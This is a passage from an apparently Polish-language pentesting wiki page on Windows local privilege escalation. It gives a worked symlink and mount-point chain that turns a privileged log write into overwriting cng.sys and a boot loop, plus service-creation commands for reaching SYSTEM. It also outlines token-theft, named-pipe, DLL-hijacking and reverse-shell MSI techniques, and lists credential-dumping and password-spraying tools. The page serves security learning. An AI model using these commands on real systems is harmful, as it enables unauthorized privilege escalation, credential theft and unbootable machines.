- Ta ścieżka zwykle odpowiada sterownikowi działającemu w trybie jądra `cng.sys`.
- Jeśli **utworzysz ją wcześniej jako folder**, Windows nie załaduje właściwego sterownika podczas uruchamiania.
- Następnie Windows próbuje załadować `cng.sys` podczas uruchamiania.
- Widzi folder, **nie może odnaleźć właściwego sterownika** i **ulega awarii lub zatrzymuje uruchamianie**.
- **Nie ma mechanizmu awaryjnego** ani **możliwości odzyskania systemu** bez zewnętrznej interwencji (np. naprawy rozruchu lub dostępu do dysku).

### Od uprzywilejowanych ścieżek logów/kopii zapasowych i symlinków OM do nadpisania dowolnego pliku / DoS rozruchu

Gdy **uprzywilejowana usługa** zapisuje logi/eksporty w ścieżce odczytanej z **zapisywalnej konfiguracji**, przekieruj tę ścieżkę za pomocą **symlinków Object Manager + punktów montowania NTFS**, aby zmienić uprzywilejowany zapis w nadpisanie dowolnego pliku (nawet **bez SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Wymagania**
- Konfiguracja przechowująca ścieżkę docelową jest zapisywalna przez atakującego (np. `%ProgramData%\...\.ini`).
- Możliwość utworzenia punktu montowania do `\RPC Control` i symlinka pliku OM (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Uprzywilejowana operacja zapisująca w tej ścieżce (log, eksport, raport).

**Przykładowy łańcuch**
1. Odczytaj konfigurację, aby ustalić uprzywilejowaną ścieżkę logu, np. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` w `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Przekieruj ścieżkę bez uprawnień administratora:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Poczekaj, aż uprzywilejowany komponent zapisze log (np. administrator wywoła „wyślij testowy SMS”). Zapis trafi teraz do `C:\Windows\System32\cng.sys`.
4. Sprawdź nadpisany plik docelowy (parser hex/PE), aby potwierdzić uszkodzenie; ponowne uruchomienie wymusi załadowanie przez Windows zmodyfikowanego sterownika → **DoS w postaci pętli rozruchowej**. Dotyczy to również dowolnego chronionego pliku, który uprzywilejowana usługa otworzy do zapisu.

> `cng.sys` jest zwykle ładowany z `C:\Windows\System32\drivers\cng.sys`, ale jeśli kopia znajduje się w `C:\Windows\System32\cng.sys`, może zostać użyta jako pierwsza, co czyni ją niezawodnym celem DoS dla uszkodzonych danych.



## **Od High Integrity do SYSTEM**

### **Nowa usługa**

Jeśli już działasz w procesie o High Integrity, **ścieżka do SYSTEM** może być prosta — wystarczy **utworzyć i uruchomić nową usługę**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Podczas tworzenia pliku binarnego usługi upewnij się, że jest on prawidłową usługą lub że plik wykonuje niezbędne działania szybko, ponieważ zostanie zakończony po 20 s, jeśli nie jest prawidłową usługą.

### AlwaysInstallElevated

Z procesu o High Integrity możesz spróbować **włączyć wpisy rejestru AlwaysInstallElevated** i **zainstalować** reverse shell przy użyciu wrappera _**.msi**_.\
[Więcej informacji o używanych kluczach rejestru oraz o tym, jak zainstalować pakiet _.msi_, znajdziesz tutaj.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Kod możesz** [**znaleźć tutaj**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Jeśli masz te token privileges (prawdopodobnie znajdziesz je w procesie o High Integrity), będziesz w stanie **otworzyć prawie każdy proces** (poza procesami chronionymi) z uprawnieniem SeDebug, **skopiować token** procesu i utworzyć **dowolny proces z tym tokenem**.\
Ta technika polega zwykle na **wybraniu dowolnego procesu działającego jako SYSTEM ze wszystkimi token privileges** (_tak, możesz znaleźć procesy SYSTEM bez wszystkich token privileges_).\
**Przykładowy kod wykorzystujący opisaną technikę możesz** [**znaleźć tutaj**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ta technika jest używana przez meterpreter do eskalacji uprawnień w `getsystem`. Polega na **utworzeniu pipe, a następnie utworzeniu lub nadużyciu usługi, aby zapisywała do tego pipe**. Następnie **serwer**, który utworzył pipe przy użyciu uprawnienia **`SeImpersonate`**, będzie mógł **podszyć się pod token** klienta pipe (usługi) i uzyskać uprawnienia SYSTEM.\
Jeśli chcesz [**dowiedzieć się więcej o name pipes, przeczytaj ten tekst**](#named-pipe-client-impersonation).\
Jeśli chcesz zobaczyć przykład [**przejścia z High Integrity do System przy użyciu name pipes, przeczytaj ten tekst**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Jeśli uda Ci się **przejąć dll**, która jest **ładowana** przez **proces** działający jako **SYSTEM**, będziesz w stanie wykonać dowolny kod z tymi uprawnieniami. Dlatego Dll Hijacking również przydaje się do tego rodzaju eskalacji uprawnień. Ponadto jest **znacznie łatwiejsze do przeprowadzenia z procesu o High Integrity**, ponieważ będzie on miał **uprawnienia do zapisu** w folderach używanych do ładowania dll.\
**Więcej o Dll hijacking możesz** [**dowiedzieć się tutaj**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Przeczytaj:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Statyczne pliki binarne impacket](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Najlepsze narzędzie do wyszukiwania lokalnych wektorów eskalacji uprawnień w Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Wyszukuje błędne konfiguracje i wrażliwe pliki (**[**sprawdź tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Wykryto.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Wyszukuje możliwe błędne konfiguracje i zbiera informacje (**[**sprawdź tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Wyszukuje błędne konfiguracje**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Pobiera zapisane informacje o sesjach PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Lokalnie użyj -Thorough.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Pobiera dane uwierzytelniające z Credential Manager. Wykryto.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Przeprowadza password spraying zebranych haseł w domenie**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh to narzędzie PowerShell do spoofingu ADIDNS/LLMNR/mDNS i ataków man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Podstawowa enumeracja Windows pod kątem privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Wyszukuje znane podatności privesc (PRZESTARZAŁE, zastąpione przez Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne kontrole **(wymagane uprawnienia administratora)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Wyszukuje znane podatności privesc (wymaga kompilacji przy użyciu VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Przeszukuje hosta w poszukiwaniu błędnych konfiguracji (to raczej narzędzie do zbierania informacji niż privesc) (wymaga kompilacji) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Pobiera dane uwierzytelniające z wielu programów (precompiled exe na github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp do C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Wyszukuje błędne konfiguracje (precompiled executable na github). Niezalecane. Nie działa prawidłowo w Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Wyszukuje możliwe błędne konfiguracje (exe z python). Niezalecane. Nie działa prawidłowo w Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Narzędzie utworzone na podstawie tego wpisu (do prawidłowego działania nie wymaga accesschk, ale może go używać).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Odczytuje wyniki **systeminfo** i rekomenduje działające exploity (lokalny python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Odczytuje wyniki **systeminfo** i rekomenduje działające exploity (lokalny Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Musisz skompilować projekt przy użyciu odpowiedniej wersji .NET ([zobacz tutaj](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Aby sprawdzić zainstalowaną wersję .NET na hoście ofiary, możesz wykonać:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```



## References

- [1] [Podstawy Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Podnoszenie uprawnień przez wykorzystanie słabych uprawnień do folderów](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation — ściągawka](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop — warsztaty Local Privilege Escalation dla Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 — ataki na Windows: AT to nowa czerń (Rob Fuller i Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation — Windows — kompletny przewodnik OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows — Privilege Escalation — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Przewodnik po Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Lista kontrolna Windows-Privilege-Escalation](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metody Windows Privilege Escalation dla pentesterów](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing z makrem Word VBA przez SMTP → deszyfrowanie poświadczeń hMailServer → Veeam CVE-2023-27532 do SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak format-string + stack BOF → VirtualAlloc ROP (RCE) i kradzież tokena jądra](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research — W pogoni za Silver Fox: kot i mysz w cieniu jądra](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 — Luka w systemie plików z podwyższonymi uprawnieniami w systemie SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Narzędzia do testowania symbolic links — użycie CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Powrót do przeszłości. Nadużywanie symbolic links w Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn — MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (port Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI — Zaufanie do Node.js kończy się źle: niebezpieczne rozwiązywanie modułów w Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Moduły Node.js: ładowanie z folderów `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits — rozwiązane zadania z listy kontrolnej C/C++](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn — funkcja RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery — NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone — CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone — Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own z Microslop: łączenie CLDFLT i wyścigów w jądrze DirectX w celu uzyskania Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Jeden I/O Ring, by wszystkimi rządzić: pełna funkcja exploit odczytu/zapisu w Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Nadużywanie dowolnego usuwania plików w celu podniesienia uprawnień i inne przydatne sztuczki](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC — kod exploitów FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure — ataki na WSUS, część 2: CVE-2020-1013, jednodniowa luka Windows 10 Local Privilege Escalation](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: poznawanie Credential Manager i Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n — PoC CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com — delegowanie Kerberos Resource Based Constrained Delegation: gdy zmiana obrazu prowadzi do podniesienia uprawnień](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com — wyodrębnianie kluczy prywatnych SSH z agenta SSH w Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps — zamienianie korporacyjnych serwerów aktualizacji w fabryki backdoorów (0_o) — część 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps — zamienianie korporacyjnych serwerów aktualizacji w fabryki backdoorów (0_o) — część 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s — NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence — podniesienie uprawnień przez usunięcie folderu Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center — CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec — Total Recall: odtwarzanie kroków prowadzących z powrotem do NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group — advisory dotyczący podniesienia uprawnień przez przesunięcia w pamięci współdzielonej Windows MIDI Services](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
